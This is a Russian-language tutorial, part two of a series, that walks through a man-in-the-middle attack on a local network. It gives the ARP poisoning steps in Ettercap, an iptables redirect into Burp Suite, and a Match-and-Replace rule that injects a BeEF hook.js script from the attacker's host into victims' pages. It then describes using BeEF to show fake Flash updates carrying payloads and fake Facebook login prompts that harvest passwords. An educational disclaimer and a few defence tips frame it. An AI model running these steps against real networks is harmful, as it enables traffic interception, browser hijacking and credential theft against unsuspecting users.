<h1>(Ettercap, Burp Suite, BeEF). MITM. Часть 2. Использование Burp Suite в атаках MITM. Подцепление на BeEF.</h1>

<b>Материал предоставлен в ознакомительных и образовательных целях.</b><br>

<b><i>Содержание</i></b><br>
<a href="#introduction">1. Введение. Требования.</a><br>
<a href="#introtoxss">2. Понятие XSS.</a><br>
<a href="#prepare">3. Подготовка среды.</a><br>
<a href="#ettercap">4. Запускаем Ettercap.</a><br>
<a href="#burpsuite">5. Запускаем Burp Suite.</a><br>
<a href="#beef">5. Запускаем BeEF.</a><br>
<a href="#configureburpsuite">6. Продолжаем конфигурировать Burp Suite.</a><br>
<a href="#example">7. Работа с BeEF.</a><br>
<a href="#end">8. Подведение итогов. Рекомендации по защите. Полезные ссылки.</a><br>

<p><a name="introduction"></a></p>
<h2>Введение. Требования.</h2>
Рад приветствовать читателей. В этой статье мы разберем использование утилиты Burp Suite для атаки MITM. Вообще, данная утилита предназначена для тестирования веб-приложений (к которым мы вернемся позже), но ее можно использовать также много еще для чего. Как уже ранее было сказано, будет использовать в атаке MITM.<br><br>
<i>Если вы не читали первую статью про MITM, обязательно прочитайте ее перед этой. Там рассмотрены понятия атаки MITM и использование утилит Bettercap и net-creds.</i><br><br>


Требования:
<ul>
  <li>Иметь доступ к сети, в которой находится цель</li>
</ul>
<i>Примечание: </i> если у вас уже есть доступ к сети, вам не нужен Wi-Fi адаптер с поддержкой режима 
мониторинга. Главное быть просто подключенным к сети.


<p><a name="introtoxss"></a></p>
<h2>Понятие XSS.</h2>
XSS (Cross Site Scripting, получил аббревиатуру XSS, а не CSS, для избежания путаницы с CSS в HTML) - атака, которая заключается в том, чтобы запустить вредносный JavaScript на стороне пользователя. <br>
Уязвимости XSS делятся на три типа:
<ul>
  <li>
    <b>Stored XSS</b><br>
    &nbsp;&nbsp;&nbsp;Пример: на доске объявлений в поле имя ввел &lt;script&gt;alert('Stored XSS')&lt;/script&gt; и теперь каждый раз, когда кто-то заходит на страницу его профиля, он видит на экране сообщение 'Stored XSS'
  </li>
  
  <li>
    <b>Reflected XSS</b><br>
    &nbsp;&nbsp;&nbsp;Пример: http://myunsafewebsite.com/store/product.php?id=&lt;script&gt;alert('ReflectedXSS')&lt;/script&gt;
  </li>
  
  <li>
    <b>DOM-Based XSS</b><br>
    &nbsp;&nbsp;&nbsp;Пример: http://myunsafewebsite.com/arictle/25/text.html#&lt;script&gt;alert('DOM-BasedXSS')&lt;/script&gt;
  </li>
</ul><br>
Приведенная выше информация на данный момент нам не особо будет нужна, т.к. безопасность веб-приложений у нас еще не скоро. Для общего развития, можно сказать.


<p><a name="prepare"></a></p>
<h2>Подготовка среды.</h2>
Чтобы было удобнее:
<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo su</pre>

Установите BeEF:
<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">apt update && apt install beef-xss</pre>

<p><a name="ettercap"></a></p>
<h2>Запускаем Ettercap.</h2>
Включите форвард пакетов:
<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">echo "1" > /proc/sys/net/ipv4/ip_forward</pre>

Запустите Ettercap:
<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">ettercap -G</pre>

<ul>
  <li>Когда откроется окно Ettercap, выберите интерфейс, который хотите использовать и нажмите ОК.</li>
  <li>Нажмите на кнопку Show hosts (у нее иконка сервера)</li>
  <li>Нажмите на лупу для того, чтобы начать поиск хостов (если нужного не появилось, попробуйте еще раз, иногда приходится трижды нажимать)</li>
  <li>Выберите IP-адрес роутера как цель 1</li>
  <li>Выберите IP-адрес атакуемого как цель 2</li>
  <li>Нажмите на меню MITM</li>
  <li>Выберите ARP Poisoning, убедитесь, что стоит галочка Sniff remote connections и нажмите ОК</li>
</ul>

(в другом терминале) 
<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo su</pre>
Чтобы перенаправлять данные с порта 80 на 8080:
<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</pre>


<p><a name="burpsuite"></a></p>
<h2>Запускаем Burp Suite.</h2>

Запустите Burp Suite.
<ul>
  <li>
    Во вкладке Proxy перейдите в подраздел Options
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;В разделе Proxy Listeners нажмите кнопку Add
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Bind to port укажите порт 8080
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В списке выберите Specific address и в выпадающем меню выберите IP-адрес, который начинается на 192.168.0/1.
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В списке выберите Specific address и в выпадающем меню выберите IP-адрес, который начинается на 192.168.0/1.
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Во вкладке Request Handling поставьте галочку “Support invisible proxying”
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Нажмите ОК
  </li>
  <li>
    Во вкладке Proxy перейдите в подраздел Intercept
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;Нажмите на Intercept is ON для того, чтобы выключить перехват и перевести кнопку в положение Intercept is OFF
  </li>
</ul>


<p><a name="beef"></a></p>
<h2>Запускаем BeEF.</h2>
Запускаем BeEF:
<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo beef-xss</pre>
При первом запуске потребует задать логин и пароль. Пароль должен отличаться от beef. Этот логин/пароль потребуется для входа в веб-интерфейс BeEF.


<p><a name="configureburpsuite"></a></p>
<h2>Продолжаем конфигурировать Burp Suite.</h2>
<ul>
  <li>Во вкладке Proxy перейдите в подраздел Options</li>
  <li>&nbsp;&nbsp;&nbsp;&nbsp;Крутите вниз, пока не найдете Match and Replace</li>
  <li>&nbsp;&nbsp;&nbsp;&nbsp;В этом разделе нажмите кнопку Add</li>
  <li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ставим тип Response body</li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Match: вписывайте
    <pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">&lt;\/head&gt;</pre>
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Replace вписывайте:
    <pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">&lt;script src=”192.168.0/1.x:3000/hook.js”&gt;&lt;/script&gt;&lt;/head&gt;</pre>
    где 192.168.0/1.x - ваш IP-адрес
  </li>
  <li>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Поставьте галочку “Regex Match”
  </li>
</ul>

Ждите, пока атакуемый откроет страницу http://. Если вам нужно внедрять этот скрипт и на страницы https://, то единственный вариант - использовать Ettercap с модулем SSLStrip (который работает криво). Вариант использовать Bettercap вместо Ettercap - не вариант, т.к. Bettercap занимает порт 8080, хотя вы можете попробовать указать в Burp Suite другой порт и в iptables - также другой, не тестировал.


<p><a name="example"></a></p>
<h2>Работа с BeEF.</h2>
BeEF позволяет практически управлять браузером, когда открыта вкладка со скриптом. Можно показать фейковое уведомление об обновлении Flash Player, куда указать исполняемый файл с полезной нагрузкой, показать окно авторизации в Facebook (истекла сессия, введите логин/пароль), после чего он попадет вам в консоль и т.д.<br><br>

Подробнее читайте по ссылке Hackware: Базовое использование BeEF в полезных ссылках.


<p><a name="end"></a></p>
<h2>Подведение итогов. Рекомендации по защите. Полезные ссылки.</h2>
<h3>Полезные ссылки.</h3>
<ul>
  <li><a href="https://cisoclub.ru/rukovodstvo-po-osushhestvleniyu-cross-site-scripting-xss/" target="_blank">Hackware: руководство по осуществлению XSS атаки</a></li>
  <li><a href="https://ru.wikipedia.org/wiki/Межсайтовый_скриптинг" target="_blank">Википедия: межсайтовый скриптинг</a></li>
  <li><a href="https://hackware.ru/?p=784&PageSpeed=noscript" target="_blank">Hackware: Базовое использование BeEF</a></li>
</ul>

<h3>Рекомендации по защите.</h3>
<ul>
  <li>Не использовать открытые сети Wi-Fi</li>
  <li>Поддерживать безопасность личной сети Wi-Fi, иначе будет равноценна открытой сети</li>
  <li>Использовать расширение NoScript (<a href="https://chrome.google.com/webstore/detail/noscript/doojmbjmlfjjnbmnoijecmcbfeoakpjm" target="_blank">Chrome Web Store</a> | <a href="https://addons.mozilla.org/en-US/firefox/addon/noscript/" target="_blank">Firefox Browser Add-ons</a>)</li>
</ul>

Итак, мы познакомились с подцеплением на BeEF при помощи Burp Suite.<br><br>
<a href="../index">Назад к списку статей...</a>
